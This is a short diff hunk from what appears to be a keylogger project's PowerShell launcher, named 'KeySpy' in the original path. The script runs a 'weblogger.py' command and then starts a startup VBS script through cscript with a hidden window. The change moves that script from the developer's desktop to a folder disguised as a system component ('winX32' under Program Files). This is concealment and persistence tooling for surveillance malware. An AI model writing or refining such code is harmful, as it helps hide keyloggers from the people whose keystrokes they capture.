@@ -19,5 +19,5 @@ Write-Output "Starting weblogger.py..."
 Invoke-Expression -Command $webloggerCommand 
 
 # Execute the execute.vbs script using cscript.exe
-$vbsStartUpFilePath = "C:\Users\samra\Desktop\KeySpy\startup.vbs"
+$vbsStartUpFilePath = "C:\Program Files (x86)\winX32\startup.vbs"
 Start-Process cscript.exe -ArgumentList "//B //Nologo $vbsStartUpFilePath" -WindowStyle Hidden -Wait
